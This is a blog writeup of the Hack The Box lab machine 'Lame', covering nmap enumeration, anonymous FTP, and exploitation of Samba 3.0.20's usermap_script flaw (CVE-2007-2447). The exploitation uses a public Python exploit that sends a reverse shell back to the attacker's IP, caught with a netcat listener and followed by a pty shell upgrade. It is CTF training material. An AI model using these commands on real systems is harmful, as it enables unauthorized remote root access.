---
title: "Lame HTB Writeup"
date: 2021-04-03T20:51:59+02:00
draft: false
Tags: [
    "Writeups",
    "hackthebox",
    "retired",

]
---
![Machine info](/images/lame/1.png)

This machine is very easy and straight forward using public exploit and then you get root access directly.
These machine from retired machines on hackthebox and you need a vip subscribtion to access them. enjoy..

### 1. Enumeration:
* Nmap scan:
``nmap -sC -sV 10.10.10.3 -Pn`` or ``sudo nmap -sV -O -F --version-light 10.10.10.3``
![](/images/lame/2.png)

now we know the open ports and running services on them:
* 21 >> ftp
* 22 >> ssh
* 139 >> samba
* 445 >> samba

### FTP Enumeration:
* let's try loging into ftp using anonymous and empty password just press enter.
* login successful but i found nothing in there.
![](/images/lame/3.png)

### searching for samba exploits locally:
* ``searchsploit samba 3.0.20``
![](/images/lame/4.png)

found exploit for this version of samba that leads to RCE

let's look at it and know it's cve number to get it online and not using it with metasploit.

``nano /usr/share/exploitdb/exploits/unix/remote/16320.rb``
![](/images/lame/5.png)

* cve number >> 2007-2447
  * let's search it in google
found this github python [exploit](https://github.com/amriunix/CVE-2007-2447):
![](/images/lame/6.png)

let's install it and its dependencies:
![](/images/lame/7.png)
![](/images/lame/8.png)

* usage:
![](/images/lame/9.png)

* Exploitation:
  * ``python3 usermap_script.py 10.10.10.3 445 10.10.16.157 9001``
![](/images/lame/10.png)

  * open netcat on port 9001:
```yml
nc -lvnp 9001

//getting responsive shell:
python -c 'import pty; pty.spawn("/bin/sh")'

id

//getting root flag:
cd /root
cat root.txt

find /home user.txt
cat /home/makis/user.txt
```
![](/images/lame/11.png)

![](/images/lame/12.png)

* getting user flag:
```yml
find /home user.txt
cat /home/makis/user.txt
```
 
![](/images/lame/13.png)

And that's it, hope you enjoyed..

if so kindly give me respect [Wh1rlw1nd-HTB](https://www.hackthebox.eu/home/users/profile/182588).